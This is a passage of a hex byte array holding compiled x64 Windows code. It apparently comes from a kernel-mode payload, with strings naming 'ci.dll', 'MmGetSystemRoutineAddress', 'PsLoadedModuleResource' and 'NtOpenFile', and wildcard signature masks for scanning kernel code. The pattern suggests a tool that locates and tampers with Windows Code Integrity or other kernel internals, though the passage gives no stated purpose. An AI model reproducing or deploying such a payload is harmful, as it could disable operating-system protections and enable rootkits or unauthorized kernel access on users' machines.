	0xAC, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xAE, 0x27, 0x00, 0x00, 0xFF, 0x25,
	0xB0, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xB2, 0x27, 0x00, 0x00, 0xFF, 0x25,
	0xB4, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xB6, 0x27, 0x00, 0x00, 0xFF, 0x25,
	0xB8, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xBA, 0x27, 0x00, 0x00, 0xFF, 0x25,
	0xBC, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xBE, 0x27, 0x00, 0x00, 0xFF, 0x25,
	0xC0, 0x27, 0x00, 0x00, 0xFF, 0x25, 0xC2, 0x27, 0x00, 0x00, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0x4D, 0x8B, 0x41, 0x38, 0x48, 0x8B, 0xCA, 0x49,
	0x8B, 0xD1, 0xE8, 0x0D, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0x41, 0x8B, 0x00, 0x4C, 0x8B, 0xC9, 0x44, 0x8B, 0xD8, 0x4C, 0x8B, 0xD1,
	0x41, 0x83, 0xE3, 0xF8, 0xA8, 0x04, 0x74, 0x13, 0x41, 0x8B, 0x40, 0x08,
	0x4D, 0x63, 0x50, 0x04, 0xF7, 0xD8, 0x4C, 0x03, 0xD1, 0x48, 0x63, 0xC8,
	0x4C, 0x23, 0xD1, 0x49, 0x63, 0xC3, 0x4E, 0x8B, 0x04, 0x10, 0x48, 0x8B,
	0x42, 0x10, 0x8B, 0x48, 0x08, 0x48, 0x8B, 0x42, 0x08, 0x0F, 0xB6, 0x54,
	0x01, 0x03, 0xF6, 0xC2, 0x0F, 0x74, 0x08, 0x8B, 0xC2, 0x83, 0xE0, 0xF0,
	0x4C, 0x03, 0xC8, 0x4D, 0x33, 0xC8, 0x49, 0x8B, 0xC9, 0xE8, 0x66, 0x01,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
	0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
	0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x4D, 0x8B, 0x51,
	0x38, 0x48, 0x8B, 0xF2, 0x4D, 0x8B, 0xF0, 0x48, 0x8B, 0xE9, 0x49, 0x8B,
	0xD1, 0x48, 0x8B, 0xCE, 0x49, 0x8B, 0xF9, 0x41, 0x8B, 0x1A, 0x48, 0xC1,
	0xE3, 0x04, 0x49, 0x03, 0xDA, 0x4C, 0x8D, 0x43, 0x04, 0xE8, 0x5E, 0xFF,
	0xFF, 0xFF, 0x8B, 0x45, 0x04, 0x24, 0x66, 0xF6, 0xD8, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x1B, 0xD2, 0xF7, 0xDA, 0x03, 0xD0, 0x85, 0x53, 0x04, 0x74,
	0x11, 0x4C, 0x8B, 0xCF, 0x4D, 0x8B, 0xC6, 0x48, 0x8B, 0xD6, 0x48, 0x8B,
	0xCD, 0xE8, 0x0E, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48,
	0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x7C,
	0x24, 0x48, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,
	0xEC, 0x10, 0x33, 0xC0, 0x33, 0xC9, 0x0F, 0xA2, 0x44, 0x8B, 0xC8, 0x33,
	0xC9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x32, 0xC0, 0x0F, 0xA2, 0x89,
	0x04, 0x24, 0x89, 0x5C, 0x24, 0x04, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54,
	0x24, 0x0C, 0x0F, 0xBA, 0xE1, 0x14, 0x73, 0x2E, 0xB3, 0x08, 0x44, 0x8A,
	0xC3, 0x0F, 0xBA, 0xE1, 0x1B, 0x73, 0x23, 0x0F, 0xBA, 0xE1, 0x1C, 0x73,
	0x1D, 0x33, 0xC9, 0x0F, 0x01, 0xD0, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B,
	0xD0, 0x44, 0x0F, 0xB6, 0xC3, 0x80, 0xE2, 0x06, 0x8D, 0x41, 0x0C, 0x80,
	0xFA, 0x06, 0x44, 0x0F, 0x44, 0xC0, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x44,
	0x3B, 0xC8, 0x7C, 0x39, 0x33, 0xC9, 0x0F, 0xA2, 0x89, 0x04, 0x24, 0x41,
	0x8A, 0xC0, 0x0C, 0x02, 0x89, 0x54, 0x24, 0x0C, 0x0F, 0xB6, 0xD0, 0x0F,
	0xBA, 0xE3, 0x09, 0x41, 0x0F, 0xB6, 0xC0, 0x0F, 0x43, 0xD0, 0x89, 0x5C,
	0x24, 0x04, 0x89, 0x4C, 0x24, 0x08, 0x44, 0x8A, 0xC2, 0xF6, 0xC3, 0x20,
	0x74, 0x0B, 0xF6, 0xC2, 0x04, 0x74, 0x06, 0x80, 0xCA, 0x10, 0x44, 0x8A,
	0xC2, 0x41, 0x80, 0xC8, 0x01, 0x44, 0x88, 0x05, 0x64, 0x36, 0x00, 0x00,
	0x33, 0xC0, 0x48, 0x83, 0xC4, 0x10, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x3B, 0x0D, 0x09, 0x36, 0x00, 0x00, 0x75, 0x10, 0x48, 0xC1, 0xC1,
	0x10, 0x66, 0xF7, 0xC1, 0xFF, 0xFF, 0x75, 0x01, 0xC3, 0x48, 0xC1, 0xC9,
	0x10, 0xE9, 0x92, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0xB2, 0x25,
	0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x2B, 0xD1, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x22, 0xF6, 0xC1, 0x07,
	0x74, 0x14, 0x66, 0x90, 0x8A, 0x01, 0x3A, 0x04, 0x11, 0x75, 0x2C, 0x48,
	0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0xF6, 0xC1, 0x07, 0x75, 0xEE, 0x4D, 0x8B,
	0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x75, 0x1F, 0x4D, 0x85, 0xC0, 0x74, 0x0F,
	0x8A, 0x01, 0x3A, 0x04, 0x11, 0x75, 0x0C, 0x48, 0xFF, 0xC1, 0x49, 0xFF,
	0xC8, 0x75, 0xF1, 0x48, 0x33, 0xC0, 0xC3, 0x1B, 0xC0, 0x83, 0xD8, 0xFF,
	0xC3, 0x90, 0x49, 0xC1, 0xE9, 0x02, 0x74, 0x37, 0x48, 0x8B, 0x01, 0x48,
	0x3B, 0x04, 0x11, 0x75, 0x5B, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x3B, 0x44,
	0x11, 0x08, 0x75, 0x4C, 0x48, 0x8B, 0x41, 0x10, 0x48, 0x3B, 0x44, 0x11,
	0x10, 0x75, 0x3D, 0x48, 0x8B, 0x41, 0x18, 0x48, 0x3B, 0x44, 0x11, 0x18,
	0x75, 0x2E, 0x48, 0x83, 0xC1, 0x20, 0x49, 0xFF, 0xC9, 0x75, 0xCD, 0x49,
	0x83, 0xE0, 0x1F, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x9B,
	0x48, 0x8B, 0x01, 0x48, 0x3B, 0x04, 0x11, 0x75, 0x1B, 0x48, 0x83, 0xC1,
	0x08, 0x49, 0xFF, 0xC9, 0x75, 0xEE, 0x49, 0x83, 0xE0, 0x07, 0xEB, 0x83,
	0x48, 0x83, 0xC1, 0x08, 0x48, 0x83, 0xC1, 0x08, 0x48, 0x83, 0xC1, 0x08,
	0x48, 0x8B, 0x0C, 0x0A, 0x48, 0x0F, 0xC8, 0x48, 0x0F, 0xC9, 0x48, 0x3B,
	0xC1, 0x1B, 0xC0, 0x83, 0xD8, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC1, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x37, 0x49, 0x83, 0xF8,
	0x10, 0x77, 0x11, 0x4C, 0x8B, 0x1A, 0x4A, 0x8B, 0x54, 0x02, 0xF8, 0x4C,
	0x89, 0x19, 0x4A, 0x89, 0x54, 0x01, 0xF8, 0xC3, 0x49, 0x83, 0xF8, 0x20,
	0x77, 0x5A, 0x0F, 0x10, 0x02, 0x42, 0x0F, 0x10, 0x4C, 0x02, 0xF0, 0x0F,
	0x11, 0x01, 0x42, 0x0F, 0x11, 0x4C, 0x01, 0xF0, 0xC3, 0x0F, 0x1F, 0x80,
	0x00, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x15, 0x48, 0x2B, 0xD1,
	0x72, 0x16, 0x44, 0x8A, 0x1C, 0x11, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8,
	0x44, 0x88, 0x59, 0xFF, 0x75, 0xF0, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0x49, 0x03, 0xC8, 0x44, 0x8A, 0x5C, 0x11, 0xFF, 0x48, 0xFF, 0xC9, 0x49,
	0xFF, 0xC8, 0x44, 0x88, 0x19, 0x75, 0xF0, 0xC3, 0x66, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x1C, 0x02,
	0x48, 0x2B, 0xD1, 0x73, 0x09, 0x4C, 0x3B, 0xD9, 0x0F, 0x87, 0x6E, 0x01,
	0x00, 0x00, 0x0F, 0x10, 0x04, 0x11, 0x48, 0x83, 0xC1, 0x10, 0xF6, 0xC1,
	0x0F, 0x74, 0x12, 0x48, 0x83, 0xE1, 0xF0, 0x0F, 0x10, 0x0C, 0x11, 0x0F,
	0x11, 0x00, 0x0F, 0x28, 0xC1, 0x48, 0x83, 0xC1, 0x10, 0x4C, 0x03, 0xC0,
	0x4C, 0x2B, 0xC1, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06, 0x74, 0x6F,
	0x49, 0x81, 0xF9, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x87, 0xB3, 0x00, 0x00,
	0x00, 0x49, 0x83, 0xE0, 0x3F, 0xEB, 0x2D, 0x66, 0x66, 0x66, 0x66, 0x66,
	0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66,
	0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x0F, 0x10, 0x0C, 0x11, 0x0F, 0x10, 0x54, 0x11,
	0x10, 0x0F, 0x10, 0x5C, 0x11, 0x20, 0x0F, 0x10, 0x64, 0x11, 0x30, 0x0F,
	0x29, 0x41, 0xF0, 0x48, 0x83, 0xC1, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29,
	0x49, 0xC0, 0x0F, 0x29, 0x51, 0xD0, 0x0F, 0x29, 0x59, 0xE0, 0x0F, 0x28,
	0xC4, 0x75, 0xD1, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x04, 0x74, 0x19,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x41, 0xF0,
	0x0F, 0x10, 0x04, 0x11, 0x48, 0x83, 0xC1, 0x10, 0x49, 0xFF, 0xC9, 0x75,
	0xEF, 0x49, 0x83, 0xE0, 0x0F, 0x74, 0x0E, 0x4E, 0x8D, 0x5C, 0x01, 0xF0,
	0x41, 0x0F, 0x10, 0x0C, 0x13, 0x41, 0x0F, 0x11, 0x0B, 0x0F, 0x29, 0x41,
	0xF0, 0xC3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06, 0x49, 0x83, 0xE0, 0x3F, 0x0F,
	0x18, 0x44, 0x11, 0x40, 0xEB, 0x2E, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
	0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x66,
	0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x90, 0x0F, 0x10, 0x0C, 0x11, 0x0F, 0x10, 0x54, 0x11,
	0x10, 0x0F, 0x10, 0x5C, 0x11, 0x20, 0x0F, 0x10, 0x64, 0x11, 0x30, 0x0F,
	0x2B, 0x41, 0xF0, 0x48, 0x83, 0xC1, 0x40, 0x0F, 0x18, 0x44, 0x11, 0x40,
	0x49, 0xFF, 0xC9, 0x0F, 0x2B, 0x49, 0xC0, 0x0F, 0x2B, 0x51, 0xD0, 0x0F,
	0x2B, 0x59, 0xE0, 0x0F, 0x28, 0xC4, 0x75, 0xCC, 0x0F, 0xAE, 0xF8, 0xE9,
	0x33, 0xFF, 0xFF, 0xFF, 0x0F, 0x1F, 0x40, 0x00, 0x49, 0x03, 0xC8, 0x0F,
	0x10, 0x44, 0x11, 0xF0, 0x48, 0x83, 0xE9, 0x10, 0x49, 0x83, 0xE8, 0x10,
	0xF6, 0xC1, 0x0F, 0x74, 0x18, 0x4C, 0x8B, 0xD9, 0x48, 0x83, 0xE1, 0xF0,
	0x0F, 0x10, 0x0C, 0x11, 0x41, 0x0F, 0x11, 0x03, 0x0F, 0x28, 0xC1, 0x4C,
	0x8B, 0xC1, 0x4C, 0x2B, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x06,
	0x74, 0x39, 0x49, 0x83, 0xE0, 0x3F, 0xEB, 0x04, 0x0F, 0x1F, 0x40, 0x00,
	0x0F, 0x10, 0x4C, 0x11, 0xF0, 0x0F, 0x10, 0x54, 0x11, 0xE0, 0x0F, 0x10,
	0x5C, 0x11, 0xD0, 0x0F, 0x10, 0x64, 0x11, 0xC0, 0x0F, 0x29, 0x01, 0x48,
	0x83, 0xE9, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29, 0x49, 0x30, 0x0F, 0x29,
	0x51, 0x20, 0x0F, 0x29, 0x59, 0x10, 0x0F, 0x28, 0xC4, 0x75, 0xD1, 0x4D,
	0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x04, 0x74, 0x19, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x01, 0x0F, 0x10, 0x44, 0x11, 0xF0,
	0x48, 0x83, 0xE9, 0x10, 0x49, 0xFF, 0xC9, 0x75, 0xEF, 0x49, 0x83, 0xE0,
	0x0F, 0x74, 0x0F, 0x4C, 0x8B, 0xD9, 0x4D, 0x2B, 0xD8, 0x41, 0x0F, 0x10,
	0x0C, 0x13, 0x41, 0x0F, 0x11, 0x0B, 0x0F, 0x29, 0x01, 0xC3, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC1, 0x0F,
	0xB6, 0xD2, 0x49, 0xB9, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
	0x49, 0x0F, 0xAF, 0xD1, 0x66, 0x48, 0x0F, 0x6E, 0xC2, 0x0F, 0x16, 0xC0,
	0x49, 0x83, 0xF8, 0x40, 0x72, 0x6E, 0xF6, 0x05, 0xD7, 0x31, 0x00, 0x00,
	0x02, 0x74, 0x0D, 0x49, 0x81, 0xF8, 0x20, 0x03, 0x00, 0x00, 0x0F, 0x83,
	0x08, 0x01, 0x00, 0x00, 0x0F, 0x11, 0x01, 0x4C, 0x03, 0xC1, 0x48, 0x83,
	0xC1, 0x10, 0x48, 0x83, 0xE1, 0xF0, 0x4C, 0x2B, 0xC1, 0x49, 0x83, 0xF8,
	0x40, 0x72, 0x47, 0x4A, 0x8D, 0x54, 0x01, 0xF0, 0x4E, 0x8D, 0x4C, 0x01,
	0xD0, 0x49, 0x83, 0xE1, 0xF0, 0x49, 0xC1, 0xE8, 0x06, 0x0F, 0x29, 0x01,
	0x0F, 0x29, 0x41, 0x10, 0x48, 0x83, 0xC1, 0x40, 0x49, 0xFF, 0xC8, 0x0F,
	0x29, 0x41, 0xE0, 0x0F, 0x29, 0x41, 0xF0, 0x75, 0xE8, 0x41, 0x0F, 0x29,
	0x01, 0x41, 0x0F, 0x29, 0x41, 0x10, 0x41, 0x0F, 0x29, 0x41, 0x20, 0x0F,
	0x11, 0x02, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x10,
	0x72, 0x2A, 0x4D, 0x8D, 0x4C, 0x08, 0xF0, 0x49, 0x83, 0xE0, 0x20, 0x0F,
	0x11, 0x01, 0x49, 0xD1, 0xE8, 0x41, 0x0F, 0x11, 0x01, 0x42, 0x0F, 0x11,
	0x04, 0x01, 0x49, 0xF7, 0xD8, 0x43, 0x0F, 0x11, 0x04, 0x01, 0xC3, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x04,
	0x72, 0x2A, 0x4D, 0x8D, 0x4C, 0x08, 0xFC, 0x49, 0x83, 0xE0, 0x08, 0x89,
	0x11, 0x49, 0xD1, 0xE8, 0x41, 0x89, 0x11, 0x42, 0x89, 0x14, 0x01, 0x49,
	0xF7, 0xD8, 0x43, 0x89, 0x14, 0x01, 0xC3, 0x66, 0x66, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74,
	0x11, 0x88, 0x11, 0x4E, 0x8D, 0x4C, 0x01, 0xFE, 0x49, 0x83, 0xF8, 0x01,
	0x74, 0x04, 0x66, 0x41, 0x89, 0x11, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x57, 0xF6, 0x05, 0xB8, 0x30, 0x00, 0x00, 0x01,
	0x74, 0x32, 0x48, 0x8B, 0xF9, 0x4C, 0x03, 0xC1, 0x0F, 0x11, 0x01, 0x48,
	0x83, 0xC7, 0x40, 0x0F, 0x11, 0x41, 0x10, 0x48, 0x83, 0xE7, 0xC0, 0x0F,
	0x11, 0x41, 0x20, 0x4C, 0x2B, 0xC7, 0x0F, 0x11, 0x41, 0x30, 0x49, 0x8B,
	0xC8, 0x4C, 0x8B, 0xC8, 0x66, 0x48, 0x0F, 0x7E, 0xC0, 0xF3, 0xAA, 0x49,
	0x8B, 0xC1, 0x5F, 0xC3, 0xE8, 0x3F, 0x00, 0x00, 0x00, 0xEB, 0xC7, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x50, 0x48, 0x83, 0xEC, 0x30, 0x0F,
	0x29, 0x44, 0x24, 0x20, 0xE8, 0x1B, 0xF9, 0xFF, 0xFF, 0x0F, 0x28, 0x44,
	0x24, 0x20, 0x48, 0x83, 0xC4, 0x30, 0x58, 0x59, 0x5A, 0x41, 0x58, 0x41,
	0x59, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x31, 0x30, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20,
	0x31, 0x31, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x57, 0x69, 0x6E, 0x64,
	0x6F, 0x77, 0x73, 0x20, 0x31, 0x31, 0x20, 0x41, 0x6C, 0x74, 0x00, 0xCC,
	0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x54, 0x69, 0x6D, 0x65, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x1D, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8D, 0x0D, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78,
	0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x00,
	0x48, 0x8D, 0x0D, 0x00, 0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78,
	0x78, 0x78, 0x78, 0x3F, 0x78, 0x78, 0x78, 0x00, 0x4D, 0x6D, 0x47, 0x65,
	0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x52, 0x6F, 0x75, 0x74, 0x69,
	0x6E, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x50, 0x00, 0x73, 0x00, 0x4C, 0x00, 0x6F, 0x00,
	0x61, 0x00, 0x64, 0x00, 0x65, 0x00, 0x64, 0x00, 0x4D, 0x00, 0x6F, 0x00,
	0x64, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x52, 0x00, 0x65, 0x00,
	0x73, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x72, 0x00, 0x63, 0x00, 0x65, 0x00,
	0x00, 0x00, 0xCC, 0xCC, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0x15, 0x00,
	0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x83, 0xF8,
	0x32, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x78, 0x78, 0x3F, 0x3F,
	0x3F, 0x3F, 0x78, 0x78, 0x78, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4E, 0x00, 0x74, 0x00, 0x4F, 0x00, 0x70, 0x00, 0x65, 0x00, 0x6E, 0x00,
	0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x00, 0x00, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x50, 0x41, 0x47, 0x45,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x63, 0x69, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00, 0xE9,
	0x00, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0x00, 0x78, 0x78, 0x78, 0x3F,
	0x3F, 0x3F, 0x3F, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x00,
	0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x00, 0xF7, 0x43, 0x40,
	0x00, 0x20, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x78, 0x78, 0x78, 0x3F,
	0x3F, 0x3F, 0x3F, 0x78, 0x3F, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC9, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x00,
	0x00, 0x00, 0x00, 0xE8, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x78, 0x78, 0x78, 0x3F, 0x3F, 0x3F, 0x3F, 0x78, 0x78, 0x78, 0x78, 0x3F,
